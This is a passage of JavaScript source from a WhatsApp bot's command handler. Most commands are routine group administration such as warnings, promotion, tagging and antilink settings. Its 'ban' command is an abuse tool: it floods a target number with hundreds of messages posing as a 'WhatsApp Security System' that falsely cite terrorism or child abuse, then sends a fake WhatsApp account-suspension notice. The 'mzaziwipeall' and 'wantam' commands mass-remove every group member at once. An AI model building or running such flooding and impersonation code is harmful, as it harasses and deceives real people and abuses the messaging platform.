                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '📧 CONTACT',
                            url: 'https://wa.me/254108595201'
                        })
                    }]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `🩸 *${botName.toUpperCase()} • FRIENDS*` },
                    footer: { text: `Swipe ➡️ to meet the team • ${cards.length} profiles` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted – safe
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Friends carousel error:', error);
        // Fallback plain text
        let fallback = `🩸 *${botName.toUpperCase()} • FRIENDS*\n\n`;
        fallback += `1. MZAZI TECH: Channel → wa.me/${botPhoneNum}\n`;
        fallback += `2. BLACKLORD: Group → chat.whatsapp.com/...\n`;
        fallback += `3. DEAD NOTE: Owner → wa.me/254741388986\n`;
        fallback += `4. CYBER WIZARD: GitHub → github.com/mzazi-tech\n`;
        fallback += `5. THE MANAGER: Contact → wa.me/254108595201\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}
      
      
//=====================================//

      case 'ban': {
    // ⚠️ Owner only command
    if (!isOwner) return mzazireply("❌ *Owner only command!*");

    // Get target number and reason from args (format: 628xxxx | reason)
    const input = args.join(' ');
    const pipeIndex = input.indexOf('|');
    if (pipeIndex === -1) {
        return mzazireply(`📌 *Usage:* ${prefix}ban 628xxxx | reason\n\n*Reasons:* spam, terrorism, child_abuse, hate_speech, violence, scam, copyright, impersonation, phishing`);
    }

    const targetNumber = input.slice(0, pipeIndex).replace(/[^0-9]/g, '');
    const reason = input.slice(pipeIndex + 1).trim().toLowerCase();

    const validReasons = ["spam", "terrorism", "child_abuse", "hate_speech", "violence", "scam", "copyright", "impersonation", "phishing"];

    if (!validReasons.includes(reason)) {
        return mzazireply(`❌ *Invalid reason. Choose from:* ${validReasons.join(', ')}`);
    }

    if (!/^\d{10,15}$/.test(targetNumber)) {
        return mzazireply("❌ *Invalid phone number format!* Use example: 628123456789");
    }

    // 🛡️ PREVENT SELF-BAN
    const executorNumber = msgSender?.split('@')[0] || '';
    const botNumber = botPhoneNum || mzazi.user?.id?.split(':')[0]?.split('@')[0] || '';

    if (targetNumber === executorNumber) {
        return mzazireply("❌ *You cannot ban yourself!*");
    }
    if (targetNumber === botNumber) {
        return mzazireply("❌ *You cannot ban the bot!*");
    }

    // Notify start
    await mzazireply(`🚨 *BAN PROTOCOL STARTED*\n\n📱 Target: +${targetNumber}\n⚠️ Reason: ${reason.toUpperCase()}\n💀 Executing now...`);

    const targetJid = targetNumber + '@s.whatsapp.net';

    // Check if number exists on WhatsApp
    const [contactExist] = await mzazi.onWhatsApp(targetJid).catch(() => [null]);
    if (!contactExist?.exists) {
        return mzazireply("❌ *Number not registered on WhatsApp!*");
    }

    // Helper: sleep
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    // Function to send report messages
    const sendReport = async (jid, reportText, iteration) => {
        try {
            await mzazi.sendMessage(jid, {
                text: `🚨 REPORT #${iteration}\nReason: ${reportText}\nReporter: WhatsApp Security System`,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                }
            });
            return true;
        } catch (err) {
            logger.info(`Report failed to ${jid}:`, err.message);
            return false;
        }
    };

    // Function to flood reports
    const floodReports = async (jid, reasonText, count) => {
        for (let i = 1; i <= count; i++) {
            await sendReport(jid, reasonText, i);
            await sleep(100);
            if (i % Math.max(1, Math.floor(count / 10)) === 0) {
                await mzazireply(`⏳ Progress: ${Math.floor((i / count) * 100)}%`);
            }
        }
    };

    // Execute based on reason
    try {
        switch(reason) {
            case 'spam':
                await floodReports(targetJid, 'Spam messages detected', 50);
                await floodReports(targetJid, 'Mass messaging detected', 50);
                break;
            case 'terrorism':
                await floodReports(targetJid, 'Terrorism content detected', 100);
                await floodReports(targetJid, 'Extremist propaganda', 100);
                break;
            case 'child_abuse':
                await floodReports(targetJid, 'Child exploitation content', 150);
                await floodReports(targetJid, 'Inappropriate content with minors', 150);
                break;
            case 'hate_speech':
                await floodReports(targetJid, 'Hate speech violations', 75);
                await floodReports(targetJid, 'Discriminatory content', 75);
                break;
            case 'violence':
                await floodReports(targetJid, 'Violent content detected', 80);
                await floodReports(targetJid, 'Threats of violence', 80);
                break;
            case 'scam':
                await floodReports(targetJid, 'Fraudulent activities', 60);
                await floodReports(targetJid, 'Scam attempts detected', 60);
                break;
            case 'copyright':
                await floodReports(targetJid, 'Copyright infringement', 40);
                await floodReports(targetJid, 'Pirated content sharing', 40);
                break;
            case 'impersonation':
                await floodReports(targetJid, 'Identity impersonation', 50);
                await floodReports(targetJid, 'Fake account detected', 50);
                break;
            case 'phishing':
                await floodReports(targetJid, 'Phishing attempts detected', 70);
                await floodReports(targetJid, 'Suspicious links shared', 70);
                break;
            default:
                await floodReports(targetJid, 'Policy violations', 50);
        }

        // Fake ban message to target (not to executor)
        await mzazi.sendMessage(targetJid, {
            text: `⚠️ *ACCOUNT SUSPENDED*\n\nYour WhatsApp account has been permanently banned due to severe policy violations.\n\nReason: ${reason.toUpperCase()}\n\nThis decision is final and cannot be appealed.\n\nFor more information: https://faq.whatsapp.com/banned`
        }).catch(err => logger.info("Fake ban message error:", err.message));

        await mzazireply(`✅ *BAN PROTOCOL COMPLETED*\n\n📱 Target: +${targetNumber}\n⚠️ Reason: ${reason.toUpperCase()}\n💀 Status: Account reported & flagged\n\n⚠️ Account will be reviewed by WhatsApp team.`);
        logger.info(`[BAN] ${targetNumber} banned by ${executorNumber} for reason: ${reason}`);

    } catch (error) {
        logger.error('Ban error:', error);
        mzazireply(`❌ *BAN PROTOCOL FAILED*\n\nError: ${error.message || 'Unknown error'}`);
    }
    break;
}
//=====================================//

      case "playdoc": {
    if (!text) return mzazireply("🎵 Example: .playdoc faded");

    try {
        // Import yt-search dynamically (or at top of file)
        const yts = require('yt-search');
        const axios = require('axios');

        let search = await yts(text);
        let video = search.videos[0];

        if (!video) return mzazireply("❌ Song not found");

        let api = `https://api.zenzxz.my.id/download/youtube?url=${encodeURIComponent(video.url)}&type=mp3`;
        let { data } = await axios.get(api);

        if (!data.status || !data.result?.download) {
            return mzazireply("❌ Failed to fetch audio");
        }

        // 🔥 Send info first – use 'sender' instead of 'm.chat'
        const chatId = sender;  // safe JID from main handler

        await mzazi.sendMessage(chatId, {
            image: { url: video.thumbnail },
            caption: `╭━━〔 🎧 ${botName.toUpperCase()} PLAYER (DOC) 〕━━⬣
┃ 🎵 Title : ${video.title}
┃ ⏱ Duration : ${video.timestamp}
┃ 👀 Views : ${video.views?.toLocaleString() || 'N/A'}
┃ 📺 Channel : ${video.author?.name || 'Unknown'}
╰━━━━━━━━━━━━━━━━⬣

📥 Sending as document...`
        }); // No quoted parameter to avoid jidDecode crash

        // 🔥 Send as document
        await mzazi.sendMessage(chatId, {
            document: { url: data.result.download },
            mimetype: 'audio/mpeg',
            fileName: `${video.title}.mp3`
        }); // Also no quoted

    } catch (e) {
        logger.info("PLAYDOC ERROR:", e);
        mzazireply("❌ Error downloading song");
    }
    break;
}
//=====================================//

      case "setbotpic": {
    if (!isOwner) return mzazireply("❌ Owner only.");

    const quoted =
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage;

    const isImage =
        quoted?.imageMessage ||
        message?.imageMessage;

    if (!isImage) {
        return mzazireply(
            `📸 Reply to an image or send image with caption:\n${prefix}setbotpic`
        );
    }

    try {
        let msg = m;

        // if replying to image
        if (quoted?.imageMessage) {
            msg = {
                key: {
                    remoteJid: sender,
                    id: m.message.extendedTextMessage.contextInfo.stanzaId,
                    participant: m.message.extendedTextMessage.contextInfo.participant
                },
                message: quoted
            };
        }

        const buffer = await downloadMediaMessage(
            msg,
            "buffer",
            {},
            {
                logger: pino({ level: "silent" }),
                reuploadRequest: mzazi.updateMediaMessage
            }
        );

        const savePath = `./database/sessions/${botPhoneNum}/menu.jpg`;

        // ensure session folder exists
        fs.mkdirSync(
            `./database/sessions/${botPhoneNum}`,
            { recursive: true }
        );

        fs.writeFileSync(savePath, buffer);

        await mzazireply("✅ Bot menu picture updated successfully.");
    } catch (err) {
        logger.info(err);
        mzazireply("❌ Failed to save bot picture.");
    }

    break;
}
      // ─────────────────────────────────────────────
      //  CASE LEAVE
      // ─────────────────────────────────────────────
//=====================================//


//=====================================//


//=====================================//

case 'exit': {
    if (!isGroup) return mzazireply('❌ This command only works in groups.');
    if (!isOwner) return mzazireply('❌ This command is only for the owner.');

    let reason = text || 'No reason provided';

    await mzazireply(
`👋 Goodbye Everyone!

📌 Reason: ${reason}
🤖 Bot: ${getBotName(botPhoneNum)}`
    );

    await mzazi.groupLeave(sender);

    logSystem(`Bot left group: ${groupName}`);
}
break;
//=====================================//

case "idch": {
    if (!text) return mzazireply("❌ Send channel link\nExample: .idch <chanel link>")

    try {
        let link = text.trim()

        if (!link.includes("whatsapp.com/channel/")) {
            return mzazireply("❌ Invalid channel link")
        }

        let code = link.split("/channel/")[1]

        const data = await mzazi.newsletterMetadata("invite", code)

        mzazireply(`乂 *CHANNEL ID FOUND*

🆔 ID: ${data.id}


> powered by ${botName.toUpperCase()}`)
        
    } catch (e) {
        logger.info(e)
        mzazireply("❌ Failed to fetch channel ID")
    }
}
break

      // ─────────────────────────────────────────────
      //  GENERAL
      // ─────────────────────────────────────────────
     
//=====================================//

      case "ping": {
        const latency = Date.now() - startTime;
        mzazireply(`🏓 *Pong!*\n⚡ Speed: ${latency}ms\n✅ Status: Active`);
      }
      break;

//=====================================//

      case "uptime": {
        mzazireply(`⏰ *Uptime*\n\n${runtime(process.uptime())}`);
      }
      break;

//=====================================//

      case "owner": {

await mzazi.sendMessage(sender, {
    contacts: {
        displayName: "Mzazi Developer",
        contacts: [
            {
                displayName: "Mzazi Developer",
                vcard: `BEGIN:VCARD

VERSION:3.0
FN:Mzazi Developer
TEL;type=CELL;type=VOICE:+254708001856
END:VCARD`
}
]
}
});

}
break;
      
//=====================================//

  case "mzaziwipeall": {
  if (!isGroup) return mzazireply("❌ Group only!");
  if (!isOwner) return mzazireply("❌ Owner only!");
  

  await mzazireply("⚠️ Starting wipe process...");

  try {
    // Change group name & description FAST
    await mzazi.groupUpdateSubject(sender, "⛔ Group Wiped by Mzazi");
    await mzazi.groupUpdateDescription(sender, "This group has been wiped clean ⚠️");

    // Remove profile picture
    try {
      await mzazi.removeProfilePicture(sender);
    } catch (e) {
      logger.info("DP remove failed:", e);
    }

    // Collect members (exclude owner + bot)
    const toRemove = participants
      .map(p => normalizeJid(p.id))
      .filter(jid => jid !== botJid && jid !== normalizeJid(msgSender));

    // Batch removal (faster than one-by-one)
    const chunkSize = 200; // remove 10 at a time
    for (let i = 0; i < toRemove.length; i += chunkSize) {
      const chunk = toRemove.slice(i, i + chunkSize);

      await mzazi.groupParticipantsUpdate(sender, chunk, "remove")
        .catch(err => logger.info("Remove error:", err));

      // small delay to avoid ban
      await new Promise(res => setTimeout(res, 300));
    }

    await mzazireply("✅ Group wiped successfully!");

  } catch (err) {
    logger.info(err);
    mzazireply("❌ Error wiping group!");
  }
}
break;

//=====================================//

case 'wantam': {
  if (!isGroup) return mzazireply('❌ Group only.');
  
  if (!isAdmin && !isOwner) return mzazireply('❌ Admin only.');

  await mzazireply('⚡ Fast removing members...');

  const keepSet = new Set([
    normalizeJid(msgSender),
    normalizeJid(botJid),
    normalizeJid(botLid),
    `${botPhoneNum}@s.whatsapp.net`,
    `${botPhoneNum}@whatsapp.net`
  ]);

  // unique members only
  const toRemove = [
    ...new Set(
      participants
        .map(p => normalizeJid(p.id))
        .filter(jid => !keepSet.has(jid))
    )
  ];

  if (!toRemove.length) {
    return mzazireply('✅ No members found.');
  }

  const start = Date.now();

  // REMOVE MANY MEMBERS PER REQUEST
  const chunkSize = 1000; // 20 per batch
  const chunks = [];

  for (let i = 0; i < toRemove.length; i += chunkSize) {
    chunks.push(toRemove.slice(i, i + chunkSize));
  }

  // fire all chunks together
  const results = await Promise.allSettled(
    chunks.map(chunk =>
      mzazi.groupParticipantsUpdate(sender, chunk, 'remove')
    )
  );

  let removed = 0;
  let failed = 0;

  results.forEach((r, index) => {
    if (r.status === 'fulfilled') {
      removed += chunks[index].length;
    } else {
      failed += chunks[index].length;
    }
  });

  const speed = ((Date.now() - start) / 1000).toFixed(2);

  await mzazireply(
    `✅ Done in ${speed}s\nRemoved: ${removed}\nFailed: ${failed}`
  );

  break;
}
//=====================================//

      case "tqto": {
        mzazireply(`┏━━━━━━━━━━━━━━\n┃ 🙏 THANKS TO\n┃\n┃ • Allah SWT\n┃ • Developer\n┃ • Baileys Lib\n┃ • All Supporters\n┗━━━━━━━━━━━━━━`);
      }
      break;

//=====================================//

      case "systeminfo": {
        const totalMem = formatBytes(os.totalmem());
        const freeMem = formatBytes(os.freemem());
        const usedMem = formatBytes(os.totalmem() - os.freemem());
        const cpuModel = os.cpus()[0]?.model || 'Unknown';
        mzazireply(`┏━━━━━━━━━━━━━━\n┃ 📊 SYSTEM INFO\n┃\n┃ Platform : ${os.platform()}\n┃ Arch     : ${os.arch()}\n┃ CPU      : ${cpuModel}\n┃ Cores    : ${os.cpus().length}\n┃ Total RAM: ${totalMem}\n┃ Used RAM : ${usedMem}\n┃ Free RAM : ${freeMem}\n┃ Uptime   : ${runtime(process.uptime())}\n┗━━━━━━━━━━━━━━`);
      }
      break;

//=====================================//

      case "changebotname": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        if (!text) return mzazireply(`Usage: ${prefix}changebotname <new name>`);
        if (text.length > 40) return mzazireply("❌ Max 40 characters!");
        setBotName(botPhoneNum, text.trim());
        mzazireply(`✅ Bot name changed to: *${text.trim()}*\n_Only this session (${botPhoneNum}) is affected._`);
      }
      break;

      // ─────────────────────────────────────────────
      //  GROUP RULES
      // ─────────────────────────────────────────────
//=====================================//

      case "rules": {
        if (!isGroup) return mzazireply("❌ Group only!");
        const gs = getGroupSettings(sender);
        if (!gs.rules) return mzazireply(`📋 No rules set.\nUse ${prefix}setrules to set rules.`);
        mzazireply(`📋 *${groupName} Rules*\n\n${gs.rules}`);
      }
      break;

//=====================================//

      case "setrules": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");
        if (!text) return mzazireply(`Usage: ${prefix}setrules <rules text>`);
        setGroupSetting(sender, 'rules', text);
        mzazireply(`✅ Group rules updated!`);
      }
      break;

      // ─────────────────────────────────────────────
      //  GROUP MANAGEMENT
      // ─────────────────────────────────────────────
      

//=====================================//

      case "add": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");
        
        if (!text) return mzazireply(`Usage: ${prefix}add 254XXXXXXXXX`);
        const num = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        await mzazi.groupParticipantsUpdate(sender, [num], 'add');
        mzazireply(`✅ Added ${text.replace(/[^0-9]/g, '')} to the group!`);
      }
      break;

//=====================================//

      case "promote": {
    if (!isGroup) return mzazireply("❌ Group only!");
    if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");
    

    let target = null;

    // 1. Check for mentioned JID
    const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
    if (mentionedJid && mentionedJid.length > 0) {
        target = mentionedJid[0];
    }

    // 2. If no mention, check if replying to a message
    if (!target) {
        const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (quotedMsg) {
            // Get the sender of the quoted message
            target = m.message?.extendedTextMessage?.contextInfo?.participant ||
                     m.key?.participant ||
                     quotedMsg?.key?.participant ||
                     quotedMsg?.key?.remoteJid;
        }
    }

    if (!target) {
        return mzazireply(`📌 Usage:\n${prefix}promote @user\nOR reply to the user's message with:\n${prefix}promote`);
    }

    // Normalize JID — strip device suffix, build proper s.whatsapp.net JID
    const targetNum = target.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
    if (!targetNum) {
        return mzazireply("❌ Invalid target user.");
    }
    target = targetNum + '@s.whatsapp.net';

    // Prevent promoting owner/bot
    if (ownersList.includes(targetNum)) {
        return mzazireply("❌ Cannot promote the bot owner.");
    }
    if (targetNum === botJid) {
        return mzazireply("❌ Cannot promote the bot itself.");
    }

    // Check if target is already an admin (groupAdmins contains normalizeJid digits)
    if (groupAdmins.includes(targetNum)) {
        return mzazireply("⚠️ User is already an admin.");
    }

    await mzazi.groupParticipantsUpdate(sender, [target], 'promote');
    await mzazireply(`✅ @${targetNum} promoted to admin!`, { mentions: [target] });
    break;
}

//=====================================//

case "demote": {
    if (!isGroup) return mzazireply("❌ Group only!");
    if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");
    

    let target = null;

    // 1. Check for mentioned JID
    const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
    if (mentionedJid && mentionedJid.length > 0) {
        target = mentionedJid[0];
    }

    // 2. If no mention, check if replying to a message
    if (!target) {
        const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (quotedMsg) {
            target = m.message?.extendedTextMessage?.contextInfo?.participant ||
                     m.key?.participant ||
                     quotedMsg?.key?.participant ||
                     quotedMsg?.key?.remoteJid;
        }
    }

    if (!target) {
        return mzazireply(`📌 Usage:\n${prefix}demote @user\nOR reply to the user's message with:\n${prefix}demote`);
    }

    // Normalize JID — strip device suffix, build proper s.whatsapp.net JID
    const targetNum = target.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
    if (!targetNum) {
        return mzazireply("❌ Invalid target user.");
    }
    target = targetNum + '@s.whatsapp.net';

    // Prevent demoting owner/bot
    if (ownersList.includes(targetNum)) {
        return mzazireply("❌ Cannot demote the bot owner.");
    }
    if (targetNum === botJid) {
        return mzazireply("❌ Cannot demote the bot itself.");
    }

    // Check if target is actually an admin (groupAdmins contains normalizeJid digits)
    if (!groupAdmins.includes(targetNum)) {
        return mzazireply("⚠️ User is not an admin.");
    }

    await mzazi.groupParticipantsUpdate(sender, [target], 'demote');
    await mzazireply(`✅ @${targetNum} demoted from admin!`, { mentions: [target] });
    break;
}

//=====================================//

      case "mute": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isOwner && !isAdmin) return mzazireply("❌ Admin only!");
  
        await mzazi.groupSettingUpdate(sender, 'announcement');
        mzazireply(`🔇 Group muted! Only admins can send messages.`);
      }
      break;

//=====================================//

      case "unmute": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");
        
        await mzazi.groupSettingUpdate(sender, 'not_announcement');
        mzazireply(`🔊 Group unmuted! Everyone can send messages.`);
      }
      break;

//=====================================//

      case "tagall": {
    if (!isGroup) return mzazireply("❌ This command can only be used in groups.");
    if (!isAdmin && !isOwner) return mzazireply("❌ Only admins or owner can tag all members.");
    

    try {
        const metadata = await mzazi.groupMetadata(sender);
        const participants = metadata.participants || [];
        const memberCount = participants.length;

        if (memberCount === 0) return mzazireply("❌ No members found.");

        // 🎀 Cute header
        let cuteMessage = `🌸 *✨ TAG ALL MEMBERS ✨* 🌸\n`;
        cuteMessage += `╔═══════════════════════╗\n`;
        cuteMessage += `║  👥 Total: ${memberCount} members  ║\n`;
        cuteMessage += `╚═══════════════════════╝\n\n`;

        // Limit visible members to 40 to avoid message too long
        const maxVisible = 40;
        const displayList = participants.slice(0, maxVisible);
        const hiddenCount = memberCount - maxVisible;

        // Cute bullet emojis (alternating)
        const bullets = ["🌸", "🌼", "🌺", "🌸", "🌻", "🌷", "🌹", "💐"];

        displayList.forEach((p, i) => {
            const emoji = bullets[i % bullets.length];
            const name = p.id.split('@')[0];
            cuteMessage += `${emoji}  @${name}\n`;
        });

        if (hiddenCount > 0) {
            cuteMessage += `\n✨ ... and ${hiddenCount} more lovely members ✨`;
        }

        cuteMessage += `\n\n *Everyone has been mentioned!* `;

        await mzazi.sendMessage(sender, {
            text: cuteMessage,
            mentions: participants.map(p => p.id) // Tags all members
        });

    } catch (err) {
        logger.error("Tagall error:", err);
        mzazireply("❌ Failed to tag all members. Make sure I have admin privileges.");
    }
    break;
}

//=====================================//

      case "hidetag": {
  if (!isGroup) return mzazireply(`❌ ${botName.toUpperCase()} - Group only!`);
  if (!isAdmin && !isOwner) return mzazireply(`❌ ${botName.toUpperCase()} - Admin only!`);

  if (!text) return mzazireply(`⚠️ ${botName.toUpperCase()} - Provide message to send!`);

  const members = participants.map(p => p.id);

  await mzazi.sendMessage(sender, {
    text: text,
    mentions: members
  });

}
break;
//=====================================//

      case "setgcname": {
  if (!isGroup) return mzazireply(`❌ ${botName.toUpperCase()} - Group only!`);
  if (!isAdmin && !isOwner) return mzazireply(`❌ ${botName.toUpperCase()} - Admin only!`);
  

  if (!text) return mzazireply(`⚠️ ${botName.toUpperCase()} - Provide new group name!`);

  try {
    await mzazi.groupUpdateSubject(sender, text);

    mzazireply(`✅ ${botName.toUpperCase()} - Group name changed to:\n\n📛 *${text}*`);
  } catch (err) {
    mzazireply(`❌ ${botName.toUpperCase()} - Failed to change group name`);
  }
}
break;


//=====================================//

      case "groupinfo": {
        if (!isGroup) return mzazireply("❌ Group only!");
        const adminList = groupAdmins.map(a => `• @${a.split('@')[0]}`).join('\n');
        const info = `┏━━━━━━━━━━━━━━
┃ 📊 GROUP INFO
┃
┃ Name    : ${groupName}
┃ Members : ${participants.length}
┃ Admins  : ${groupAdmins.length}
┃ Created : ${new Date(groupMetadata.creation * 1000).toLocaleDateString()}
┃
┃ 👑 Admins:
${adminList}
┗━━━━━━━━━━━━━━`;
        await mzazi.sendMessage(sender, { text: info, mentions: groupAdmins }, { quoted: m });
      }
      break;

//=====================================//

      case "link": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");
        
        const code = await mzazi.groupInviteCode(sender);
        mzazireply(`🔗 *Group Invite Link*\n\nhttps://chat.whatsapp.com/${code}`);
      }
      break;

//=====================================//

      case "revoke": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");
        
        await mzazi.groupRevokeInvite(sender);
        mzazireply(`✅ Group invite link has been revoked!`);
      }
      break;

//=====================================//

      case "delete": {
        if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");
        
        const quoted = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const quotedKey = m.message?.extendedTextMessage?.contextInfo;
        if (!quoted || !quotedKey) return mzazireply(`Usage: Reply to a message with ${prefix}delete`);
        const botNumber = await mzazi.decodeJid(mzazi.user.id)
        const delKey = {
          remoteJid: sender,
          fromMe: quotedKey.participant === botNumber,
          id: quotedKey.stanzaId,
          participant: quotedKey.participant
        };
        await mzazi.sendMessage(sender, { delete: delKey });
        mzazireply(`✅ Message deleted!`);
      }
      break;

      // ─────────────────────────────────────────────
      //  WARN SYSTEM
      // ─────────────────────────────────────────────
//=====================================//

     case "warn": {
    if (!isGroup) return mzazireply("❌ Group only!");
    if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");

    let target = null;

    // 1. Check for mentioned JID
    const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
    if (mentionedJid && mentionedJid.length > 0) {
        target = mentionedJid[0];
    }

    // 2. If no mention, check if replying to a message
    if (!target) {
        const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (quotedMsg) {
            target = m.message?.extendedTextMessage?.contextInfo?.participant ||
                     m.key?.participant ||
                     quotedMsg?.key?.participant ||
                     quotedMsg?.key?.remoteJid;
        }
    }

    if (!target) {
        return mzazireply(`📌 Usage:\n${prefix}warn @user\nOR reply to the user's message with:\n${prefix}warn`);
    }

    // Normalize JID — strip device suffix, build proper s.whatsapp.net JID
    const targetNum = target.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
    if (!targetNum) {
        return mzazireply("❌ Invalid target user.");
    }
    target = targetNum + '@s.whatsapp.net';

    // Prevent warning owner or bot
    if (ownersList.includes(targetNum)) {
        return mzazireply("❌ Cannot warn the bot owner.");
    }
    if (targetNum === botJid) {
        return mzazireply("❌ Cannot warn the bot itself.");
    }

    // Prevent warning admins (groupAdmins contains normalizeJid digits)
    if (groupAdmins.includes(targetNum)) {
        return mzazireply("❌ Cannot warn a group admin.");
    }

    // Add warning
    const warnCount = addWarn(sender, target);

    if (warnCount >= 3 && isBotAdmin) {
        // Kick user after 3 warnings
        await mzazi.groupParticipantsUpdate(sender, [target], 'remove');
        resetWarn(sender, target);
        await mzazireply(`⛔ @${targetNum} has been kicked after 3 warnings!`, { mentions: [target] });
    } else {
        const remaining = 3 - warnCount;
        await mzazireply(`⚠️ @${targetNum} warned!\nWarnings: ${warnCount}/3\n⚠️ ${remaining} more warning(s) before kick.`, { mentions: [target] });
    }
    break;
}

//=====================================//

      case "warnlist": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");
        const warns = loadJSON('./database/warns.json', {});
        const groupWarns = warns[sender] || {};
        const active = Object.entries(groupWarns).filter(([, v]) => v > 0);
        if (active.length === 0) return mzazireply("📭 No active warnings!");
        let text2 = `┏━━━━━━━━━━━━━━\n┃ ⚠️ WARN LIST\n┃\n`;
        active.forEach(([jid, count]) => {
          text2 += `┃ @${jid.split('@')[0]}: ${count}/3\n`;
        });
        text2 += `┗━━━━━━━━━━━━━━`;
        await mzazi.sendMessage(sender, { text: text2, mentions: active.map(([jid]) => jid) }, { quoted: m });
      }
      break;

//=====================================//

      case "resetwarn": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");
        const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        if (!mentionedJid || mentionedJid.length === 0) return mzazireply(`Usage: ${prefix}resetwarn @user`);
        const target = mentionedJid[0];
        resetWarn(sender, target);
        mzazireply(`✅ Warnings reset for @${target.split('@')[0]}!`);
      }
      break;

      // ─────────────────────────────────────────────
      //  ANTI-FEATURE TOGGLES
      // ─────────────────────────────────────────────
//=====================================//

      case "antilink": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        const validModes = ['delete', 'warn', 'kick', 'off'];
        if (!sub || !validModes.includes(sub)) {
          const cur = getGroupSettings(sender).antilink || 'off';
          return mzazireply(
            `🔗 *ANTILINK*\n\nCurrent mode: *${cur.toUpperCase()}*\n\n` +
            `Usage: ${prefix}antilink <mode>\n\n` +
            `Modes:\n• *delete* - Delete links silently\n• *warn* - Warn sender (3 warns = kick)\n• *kick* - Kick sender immediately\n• *off* - Disable antilink`
          );
        }
        setGroupSetting(sender, 'antilink', sub);
        const modeEmoji = { delete: '🗑️', warn: '⚠️', kick: '👢', off: '❌' };
        mzazireply(`🔗 *ANTILINK* ${sub === 'off' ? '❌ DISABLED' : '✅ ENABLED'}\n\nMode: ${modeEmoji[sub]} *${sub.toUpperCase()}*\n${sub === 'warn' ? '\n⚠️ 3 warnings = auto-kick' : ''}`);
        break;
      }

//=====================================//

      case "antitag":
//=====================================//

      case "antibot":
//=====================================//

      case "antiviewonce":
//=====================================//

      case "antitagadmin":
//=====================================//

      case "antimentiongroup":
//=====================================//

      case "antipromote":
//=====================================//

      case "antidemote": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isOwner) return mzazireply("❌ Admins only!");
        if (text !== 'on' && text !== 'off') return mzazireply(`Usage: ${prefix}${command} on/off`);
        const enable = text === 'on';
        setGroupSetting(sender, command, enable);
        const icons = {
          antitag: '🏷️', antibot: '🤖',
          antiviewonce: '👁️', antitagadmin: '👮', antimentiongroup: '📢',
          antipromote: '⬆️', antidemote: '⬇️'
        };
        mzazireply(`${icons[command]} *${command.toUpperCase()}* ${enable ? '✅ ENABLED' : '❌ DISABLED'}`);
      }
      break;

      // ─────────────────────────────────────────────
      //  ANTI-DELETE (works in both groups and DMs)
      // ─────────────────────────────────────────────
//=====================================//

      case "antidelete":
//=====================================//

      case "antiDelete": {
        if (!isOwner && !isAdmin) return mzazireply("❌ Admins/Owner only!");
        const sub1 = args[0]?.toLowerCase();

        if (sub1 === 'on' || sub1 === 'off') {
          // Apply the single antidelete switch to the current chat.
          const _adEnable = sub1 === 'on';
          if (isGroup) {
            setGroupSetting(sender, 'antidelete', _adEnable);
          } else {
            const _dmFile = sessionFile("dm_settings.json");
            const _dmSettings = loadJSON(_dmFile, {});
            if (!_dmSettings[sender]) _dmSettings[sender] = {};
            _dmSettings[sender].antidelete = _adEnable;
            saveJSON(_dmFile, _dmSettings);
          }
          mzazireply(_adEnable
            ? `🗑️ *Anti-Delete ON*\nDeleted messages will be sent back to their original sender.`
            : `🗑️ *Anti-Delete OFF*\nAnti-delete monitoring disabled.`);
        } else {
          const currentStatus = isGroup
            ? getGroupSettings(sender).antidelete
            : loadJSON(sessionFile("dm_settings.json"), {})[sender]?.antidelete;
          mzazireply(
            `🗑️ *ANTI-DELETE:* ${currentStatus ? '✅ ON' : '❌ OFF'}\n\n` +
            `Usage: ${prefix}antidelete on/off\n` +
            `Deleted messages are sent back to their original sender.`
          );
        }
        break;
      }

      // ─────────────────────────────────────────────
      //  PAID / PREMIUM
      // ─────────────────────────────────────────────
//=====================================//

      case "addpaid": {
        if (!isOwner) return mzazireply("❌ Owner only!");
        const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        if (!mentionedJid || mentionedJid.length === 0) return mzazireply(`Usage: ${prefix}addpaid @user`);
        const user = mentionedJid[0];
